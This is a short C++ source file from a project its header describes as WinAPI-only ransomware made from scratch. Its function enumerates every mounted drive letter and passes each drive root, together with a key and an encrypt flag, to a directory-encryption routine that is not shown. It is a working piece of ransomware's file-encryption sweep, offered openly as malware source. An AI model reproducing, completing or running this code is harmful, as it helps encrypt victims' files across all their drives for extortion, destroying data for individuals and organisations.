/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "HandleInstallation.h"

int handleInstallation(std::string privateKey, BOOL encrypt) {
	DWORD drives = GetLogicalDrives();
	for (char i = 0; i < 26; i++) {
		if ((drives & (1 << i))) // if drive exists basically
		{
			TCHAR driveName[] = { TEXT('A') + i, TEXT(':'), TEXT('\\'), TEXT('\0') };
			// MessageBox(NULL, driveName, NULL, NULL);

			if (!handleDirectory(privateKey, driveName, encrypt)) { // NEEDS prepending slash
				MessageBox(NULL, L"Encryption method failed!", NULL, NULL);
				return 0;
			}
		}
	}

	return 1;
}
